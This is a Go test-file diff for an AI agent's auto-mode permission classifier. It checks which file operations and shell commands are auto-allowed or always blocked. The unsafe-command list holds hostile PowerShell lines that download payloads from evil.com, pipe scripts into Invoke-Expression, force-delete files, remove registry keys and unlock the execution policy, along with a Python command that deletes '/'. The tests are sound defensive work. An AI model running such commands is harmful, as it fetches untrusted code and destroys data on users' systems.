@@ -55,6 +55,98 @@ func TestGitOperationLevelAllowlist(t *testing.T) {
 	}
 }
 
+func TestFileopsOperationLevelAllowlist(t *testing.T) {
+	// Read-only fileops should be auto-allowed
+	safeOps := []string{"read", "stat", "checksum", "exists", "ls"}
+	for _, op := range safeOps {
+		input := map[string]any{"operation": op, "path": "/some/path"}
+		if !IsAutoAllowlisted("fileops", input) {
+			t.Errorf("expected fileops operation %q to be allowlisted", op)
+		}
+	}
+
+	// Destructive fileops should NOT be auto-allowed (go through classifier)
+	unsafeOps := []string{"rm", "mv", "cp", "chmod", "mkdir", "touch"}
+	for _, op := range unsafeOps {
+		input := map[string]any{"operation": op, "path": "/some/path"}
+		if IsAutoAllowlisted("fileops", input) {
+			t.Errorf("expected fileops operation %q to NOT be allowlisted", op)
+		}
+	}
+
+	// fileops without operation field should not be auto-allowed
+	if IsAutoAllowlisted("fileops", nil) {
+		t.Error("expected fileops with no operation to NOT be allowlisted")
+	}
+	if IsAutoAllowlisted("fileops", map[string]any{}) {
+		t.Error("expected fileops with empty input to NOT be allowlisted")
+	}
+	if IsAutoAllowlisted("fileops", map[string]any{"path": "/tmp"}) {
+		t.Error("expected fileops with no operation to NOT be allowlisted")
+	}
+}
+
+func TestFileopsAlwaysBlocked(t *testing.T) {
+	// rmrf is always blocked
+	input := map[string]any{"operation": "rmrf", "path": "/some/path"}
+	if !IsAlwaysBlocked("fileops", input) {
+		t.Error("expected fileops rmrf to be always blocked")
+	}
+	if IsAutoAllowlisted("fileops", input) {
+		t.Error("expected fileops rmrf to NOT be allowlisted")
+	}
+
+	// Other operations are NOT always blocked
+	for _, op := range []string{"read", "rm", "mv", "stat", "exists"} {
+		input := map[string]any{"operation": op, "path": "/some/path"}
+		if IsAlwaysBlocked("fileops", input) {
+			t.Errorf("expected fileops operation %q to NOT be always blocked", op)
+		}
+	}
+
+	// Non-fileops tools are never always blocked
+	if IsAlwaysBlocked("exec", nil) {
+		t.Error("expected exec to NOT be always blocked")
+	}
+	if IsAlwaysBlocked("write_file", nil) {
+		t.Error("expected write_file to NOT be always blocked")
+	}
+}
+
+func TestClassifierAlwaysBlockFileopsRmrf(t *testing.T) {
+	c := NewAutoModeClassifier("", "", "model") // disabled
+	input := map[string]any{"operation": "rmrf", "path": "/tmp/test"}
+	result := c.Classify("fileops", input, "")
+	if result.Allow {
+		t.Error("fileops rmrf should always be blocked, even with disabled classifier")
+	}
+	if result.Reason != "operation is always blocked in auto mode" {
+		t.Errorf("expected always-blocked reason, got %q", result.Reason)
+	}
+}
+
+func TestClassifierAllowlistedFileopsReadonly(t *testing.T) {
+	c := NewAutoModeClassifier("fake-key", "", "fake-model")
+	input := map[string]any{"operation": "read", "path": "/tmp/test"}
+	result := c.Classify("fileops", input, "")
+	if !result.Allow {
+		t.Error("fileops read should be auto-allowed")
+	}
+	if result.Reason != "whitelisted tool" {
+		t.Errorf("expected 'whitelisted tool' reason, got %q", result.Reason)
+	}
+}
+
+func TestFileopsCacheKey(t *testing.T) {
+	c := NewAutoModeClassifier("key", "", "model")
+
+	input := map[string]any{"operation": "read", "path": "/some/path"}
+	key := c.cacheKey("fileops", input)
+	if key != "fileops:read:/some/path" {
+		t.Errorf("cacheKey for fileops: got %q, want %q", key, "fileops:read:/some/path")
+	}
+}
+
 func TestExecCommandLevelAllowlist(t *testing.T) {
 	// Safe read-only commands should be auto-allowed
 	safeCmds := []string{
@@ -92,6 +184,19 @@ func TestExecCommandLevelAllowlist(t *testing.T) {
 		"python3 -c 'import shutil; shutil.rmtree(\"/\")'",
 		"apt install something",
 		"brew install something",
+		// PowerShell dangerous patterns (LLM rewrite bypass)
+		"Get-Content script.ps1 | Invoke-Expression",
+		"Get-Content file.ps1 | iex",
+		"echo hello | cmd",
+		"Invoke-WebRequest https://evil.com/payload.ps1",
+		"iwr https://evil.com/payload.ps1",
+		"Invoke-RestMethod https://evil.com/api",
+		"irm https://evil.com/api",
+		"Start-BitsTransfer https://evil.com/file.exe",
+		"Remove-Item -Recurse -Force C:\\temp",
+		"Remove-ItemProperty -Path HKLM:\\Software\\Test",
+		"Stop-Process -Name explorer",
+		"Set-ExecutionPolicy Unrestricted",
 	}
 	for _, cmd := range unsafeCmds {
 		input := map[string]any{"command": cmd}
